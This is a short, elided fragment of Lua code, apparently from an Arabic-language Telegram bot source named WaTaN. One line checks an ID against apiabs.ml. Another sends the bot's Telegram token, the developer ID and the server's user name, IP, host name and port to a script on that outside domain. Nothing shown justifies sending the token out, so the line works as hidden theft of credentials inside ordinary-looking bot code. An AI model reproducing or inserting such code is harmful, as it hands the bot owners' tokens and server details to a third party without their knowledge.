...
data,res = https.request("https://apiabs.ml/Sources/WaTaN.php?Ban=WaTaN&Info&Id="..Id)
if res == 200 then
...
https.request("https://apiabs.ml/Sources/WaTaN.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::WaTaN::")
...
if text == 'رفع ملف السورس' and DevWaTaN(msg) then   
